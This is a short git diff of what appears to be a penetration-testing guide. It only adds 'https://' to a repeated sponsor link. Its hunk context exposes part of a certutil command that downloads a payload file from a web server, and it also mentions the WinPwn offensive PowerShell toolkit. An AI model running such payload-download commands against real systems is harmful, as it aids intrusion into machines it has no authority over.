@@ -16,7 +16,7 @@
 
 <figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-**[Follow HackenProof](bit.ly/3xrrDrL) to learn more about web3 bugs**
+**[Follow HackenProof](https://bit.ly/3xrrDrL) to learn more about web3 bugs**
 
 🐞 Read web3 bug tutorials
 
@@ -330,7 +330,7 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 
 <figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-**[Follow HackenProof](bit.ly/3xrrDrL) to learn more about web3 bugs**
+**[Follow HackenProof](https://bit.ly/3xrrDrL) to learn more about web3 bugs**
 
 🐞 Read web3 bug tutorials
 
@@ -586,7 +586,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive
 
 <figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
-**[Follow HackenProof](bit.ly/3xrrDrL) to learn more about web3 bugs**
+**[Follow HackenProof](https://bit.ly/3xrrDrL) to learn more about web3 bugs**
 
 🐞 Read web3 bug tutorials
 
